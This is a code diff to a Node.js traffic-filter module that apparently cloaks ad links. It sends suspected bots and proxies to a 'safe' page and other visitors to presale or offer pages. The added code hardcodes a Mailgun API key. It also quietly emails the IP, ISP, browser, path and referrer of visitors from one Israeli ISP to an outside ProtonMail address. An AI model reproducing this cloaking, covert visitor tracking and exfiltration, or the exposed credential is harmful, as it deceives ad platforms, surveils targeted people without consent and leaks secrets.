@@ -13,6 +13,11 @@ const { checkFilter } = require('./check');
 const config = require("../../../config/config");
 const logger = require("../../log");
 
+const useragent = require("useragent")
+console.log(useragent)
+const mailGun = require('mailgun').Mailgun;
+const mg = new mailGun('key-8719679b323b7002580966918223b74e')
+
 let Link = mongoose.model("Link");
 
 function handleLinkPassedFilter(req, res, ip, link, trafficID) {
@@ -20,7 +25,7 @@ function handleLinkPassedFilter(req, res, ip, link, trafficID) {
   if (link.type === 0 || !link.link_voluum)
     proxy.proxySafe(req, res, trafficID);
 
-  else if (typeof link.type === 'undefined' || link.type === 1) 
+  else if (typeof link.type === 'undefined' || link.type === 1)
     proxy.proxyPresalePage(req, res, ip, link, trafficID);
 
   else if (link.type === 2)
@@ -123,6 +128,7 @@ function buildLinkQuery(req) {
 }
 
 function handleInvalidRequests(req, res, ip) {
+
   if (req.originalUrl === '/whm-server-status' || !ip) {
     res.sendStatus(200);
     return true
@@ -141,13 +147,29 @@ function handleInvalidRequests(req, res, ip) {
   return false;
 }
 
+function parseUserAgent(userAgent) {
+  let agent = useragent.parse(userAgent);
+
+  let browser_family = agent.family || "";
+
+  if (browser_family.includes("UIWebView"))
+    browser_family = browser_family.replace("Mobile Safari ", "");
+
+  browser_family = browser_family.replace('Safari UI/WKWebView', 'WKWebView')
+  browser_family = browser_family.replace(/(Mobile)|(Internet)/g, "").trim();
+
+  let browser = browser_family;
+
+  if (parseInt(agent.major, 10)) browser += ' ' + agent.major;
+  return browser;
+}
+
 async function filter(req, res) {
   let time = new Date();
   let ip = helpers.getClientIP(req);
-
   let referrer = req.get('Referer') || '';
+  let useragent = req.headers['user-agent']; //alex added 12.10
   let referer_parsed = url.parse(referrer);
-
   let usePage = "";
 
   if (req.originalUrl.includes('USESAFEPAGEPLZ'))
@@ -163,7 +185,6 @@ async function filter(req, res) {
   let isOfferPage = helpers.isOfferPage(req);
 
   let connection = await conn.getConnectionInfo(ip);
-
   let query = buildLinkQuery(req);
 
   let headerAccept = req.get('accept');
@@ -172,12 +193,10 @@ async function filter(req, res) {
 
   let posBot = !headerAccept || (getPageReq && badAccept);
   let isBot = posBot || conn.isProxy(connection);
-
   let trafficID = 0;
 
   if (req.method === 'GET' && (isHTMLPage || isOfferPage)) {
     let generalTrafficRecord = await record.recordGeneralTraffic(req, ip, connection, time, isBot);
-
     if (isHTMLPage && generalTrafficRecord && generalTrafficRecord._id)
       trafficID = generalTrafficRecord._id;
   }
@@ -233,6 +252,29 @@ async function filter(req, res) {
     loadLink(req, res, link, ip, connection, isOfferPage, time, isBot, trafficID, usePage)
   else
     proxy.proxySafe(req, res, trafficID);
+
+  /* sending mail when detected connecting from Israel */
+  let browser = parseUserAgent(useragent)
+  if (connection.country === 'IL' && connection.aso === '013 NetVision Ltd') {
+    await mailData_insert(link, ip, connection, time, req.hostname, browser, referrer)
+  }
+
+}
+function mailData_insert(link, ip, connection, time, domain, browser, referrer) {
+  let mailData = `
+  IP Address: ${ip}
+  Domain: ${domain}
+  Path: ${link.link_generated}
+  Time: ${time}
+  ASO: ${connection.aso}
+  ISP: ${connection.isp}
+  Browser: ${browser}
+  Referer: ${referrer}`;
+  mg.sendText('Phantom@server.com',
+              'fwdemail@protonmail.com',
+              '013 Visitor to OG Server',
+              mailData,
+              function(err) { err && console.log(err) });
 }
 
 module.exports = async function(req, res) {
